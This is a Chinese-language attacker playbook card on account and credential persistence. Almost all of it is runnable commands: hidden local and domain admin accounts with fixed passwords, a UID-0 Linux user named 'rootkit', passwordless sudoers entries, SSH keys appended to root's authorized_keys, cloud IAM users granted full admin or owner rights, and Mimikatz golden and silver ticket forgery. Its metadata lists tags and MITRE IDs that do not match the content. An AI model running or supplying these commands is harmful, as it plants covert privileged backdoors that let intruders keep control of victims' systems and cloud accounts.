---
id: 07-003
title: "账户创建与凭证持久化 (Account Persistence)"
category: 持久化
category_en: Persistence
difficulty: ★★★
tools: "net user, dsquery, ssh-keygen, Azure AD, IAM"
last_updated: 2026-05
tags: ["persistence", "bootkit", "startup-autostart", "account-persistence"]
subdomain: persistence
nist_csf: ["PR.AC-01", "DE.CM-01"]
mitre_attack: ["T1543", "T1547", "T1136", "T1053"]
---
# 账户创建与凭证持久化 (Account Persistence)

## 概述

通过创建新账户、修改现有账户权限或植入持久化凭证（SSH 密钥、云服务访问密钥），攻击者可在网络中获得稳定的访问入口。该技术在 Windows 域环境、Linux 服务器和云平台中均有广泛应用。

## 核心技能

### 1. Windows 本地账户创建

```cmd
# 创建隐藏本地管理员账户
net user backup$ P@ssw0rd! /add
net localgroup Administrators backup$ /add
net localgroup "Remote Desktop Users" backup$ /add

# 以 $ 结尾的用户名在 net users 中默认不显示
# 但可通过 Computer Management 或 regedit 看到

# PowerShell 创建
New-LocalUser -Name "support$" -Password (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member "support$"
Add-LocalGroupMember -Group "Remote Management Users" -Member "support$"
```

### 2. 域账户持久化

```powershell
# 创建域账户 (需域管理员权限)
New-ADUser -Name "svc-monitor" -SamAccountName "svc-monitor" -UserPrincipalName "svc-monitor@domain.com" -Enabled $true -PasswordNeverExpires $true
Set-ADAccountPassword -Identity "svc-monitor" -NewPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)
Add-ADGroupMember -Identity "Domain Admins" -Members "svc-monitor"

# 将现有低权限账户添加到高权限组
Add-ADGroupMember -Identity "Enterprise Admins" -Members "john.doe"

# 利用服务账户 (GMSA) 隐藏
# GMSA 密码自动管理，不易被发现异常
New-ADServiceAccount -Name "SVC_Backup" -DNSHostName "backup.domain.com"
```

### 3. Linux 账户持久化

```bash
# 创建隐藏系统用户 (UID < 1000 不在登录界面显示)
useradd -M -s /bin/bash -u 0 -o -g 0 rootkit  # UID 0 映射为 root
useradd -r -s /bin/bash sysbackup
echo "sysbackup:P@ssw0rd!" | chpasswd
usermod -aG sudo sysbackup

# 创建系统服务用户
useradd -r -s /sbin/nologin sysupdate
# 添加到 sudoers
echo "sysupdate ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/sysupdate

# SSH 密钥持久化
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root SSH 密钥后门
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> /root/.ssh/authorized_keys

# SSH 配置后门 — 允许密钥认证
echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
systemctl restart sshd

# 创建隐藏用户 (不写入 /etc/passwd, 直接操作 /etc/shadow)
# 注意: 此方法需要直接修改 shadow 文件，需谨慎
```

### 4. 云平台 IAM 持久化

```bash
# AWS - 创建 IAM 用户并生成 API 密钥
aws iam create-user --user-name backup-admin
aws iam attach-user-policy --user-name backup-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup-admin

# AWS - 创建 IAM Role 跨账户信任
# 在受害账户中创建 Role，允许攻击者账户 AssumeRole
aws iam create-role --role-name CrossAccountBackup --assume-role-policy-document file://trust-policy.json

# Azure - 创建服务主体
az ad sp create-for-rbac --name "backup-agent" --role Contributor

# Azure AD - 创建新用户
az ad user create --display-name "Backup Admin" --user-principal-name backup@domain.com --password "P@ssw0rd!"
az role assignment create --assignee backup@domain.com --role "Global Administrator"

# GCP - 创建服务账号
gcloud iam service-accounts create backup-sa --display-name "Backup Service Account"
gcloud iam service-accounts keys create key.json --iam-account backup-sa@project.iam.gserviceaccount.com
gcloud projects add-iam-policy-binding $PROJECT --member "serviceAccount:backup-sa@project.iam.gserviceaccount.com" --role "roles/owner"
```

### 5. Kerberos 黄金票据与白银票据

```powershell
# 黄金票据 — 伪造 KRBTGT 票据 (需域控 KRBTGT Hash)
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # kerberos::golden /domain:domain.com /sid:S-1-5-21-... /krbtgt:krbtgt-hash /user:Administrator /id:500 /ptt

# 白银票据 — 伪造服务票据 (需服务账户 Hash)
mimikatz # kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:CIFS/file-server.domain.com /service:CIFS /rc4:service-hash /user:Administrator /id:500 /ptt
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| net.exe / net1.exe | Windows 账户管理 | 系统内置 |
| Mimikatz | Kerberos 票据伪造 | https://github.com/gentilkiwi/mimikatz |
| Impacket | AD 域工具集 | https://github.com/fortra/impacket |
| AWS CLI | AWS IAM 管理 | https://aws.amazon.com/cli/ |
| Azure CLI | Azure AD 管理 | https://learn.microsoft.com/cli/azure/ |

## 参考资源

- [MITRE ATT&CK — Create Account (T1136)](https://attack.mitre.org/techniques/T1136/)
- [MITRE ATT&CK — Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/)
- [MITRE ATT&CK — Valid Accounts (T1078)](https://attack.mitre.org/techniques/T1078/)
- [HackTricks — Credentials & Persistence](https://book.hacktricks.xyz/)
